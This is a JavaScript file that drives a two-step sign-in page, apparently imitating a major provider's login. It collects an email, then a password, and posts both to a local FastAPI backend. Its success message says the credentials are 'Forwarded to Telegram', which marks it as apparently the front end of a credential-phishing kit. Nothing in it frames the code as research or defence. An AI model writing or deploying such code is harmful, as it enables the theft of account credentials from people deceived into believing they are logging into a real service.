let currentStep = 1;
let storedEmail = "";

document.addEventListener("DOMContentLoaded", () => {
  const loginForm = document.getElementById("loginForm");
  const submitBtn = document.getElementById("submitBtn");

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault(); // Stop normal form submission page reload
    await handleNext();
  });
});

async function handleNext() {
  const messageDiv = document.getElementById("message");
  const submitBtn = document.getElementById("submitBtn");

  if (currentStep === 1) {
    const emailInput = document.getElementById("email").value.trim();

    if (!emailInput) {
      messageDiv.style.color = "red";
      messageDiv.innerText = "Enter an email or phone number";
      return;
    }

    // Save email and transition to password step
    storedEmail = emailInput;
    messageDiv.innerText = "";

    document.getElementById("step-email").style.display = "none";
    document.getElementById("step-password").style.display = "block";
    document.getElementById("subtitle-text").innerText = storedEmail;
    document.getElementById("left-link").innerText = "Forgot password?";
    
    // Change button text to "Log in" on Step 2
    submitBtn.innerText = "Log in";

    currentStep = 2;

  } else if (currentStep === 2) {
    const passwordInput = document.getElementById("password").value;

    if (!passwordInput) {
      messageDiv.style.color = "red";
      messageDiv.innerText = "Enter a password";
      return;
    }

    // Send email + password to FastAPI
    try {
      const response = await fetch("http://127.0.0.1:8000/api/auth", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          email: storedEmail,
          password: passwordInput,
          action: "signup"
        })
      });

      const data = await response.json();

      if (response.ok) {
        messageDiv.style.color = "green";
        messageDiv.innerText = "Success! Forwarded to Telegram.";
      } else {
        messageDiv.style.color = "red";
        messageDiv.innerText = data.detail || "An error occurred.";
      }
    } catch (error) {
      console.error(error);
      messageDiv.style.color = "red";
      messageDiv.innerText = "Could not connect to backend server.";
    }
  }
}